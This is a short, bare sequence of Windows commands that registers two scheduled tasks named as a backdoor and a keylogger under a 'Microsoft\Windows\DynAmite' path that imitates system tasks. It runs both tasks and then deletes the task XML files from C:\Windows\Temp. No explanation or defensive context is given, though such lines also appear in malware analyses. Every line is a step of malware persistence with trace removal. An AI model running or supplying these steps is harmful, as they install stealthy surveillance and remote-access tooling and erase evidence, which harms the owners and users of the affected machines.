
schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Backdoor" /XML C:\Windows\Temp\task.xml
schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Keylogger" /XML C:\Windows\Temp\task2.xml
SCHTASKS /run /TN "Microsoft\Windows\DynAmite\Backdoor"
SCHTASKS /run /TN "Microsoft\Windows\DynAmite\Keylogger"
Remove-Item "C:\Windows\Temp\*.xml"

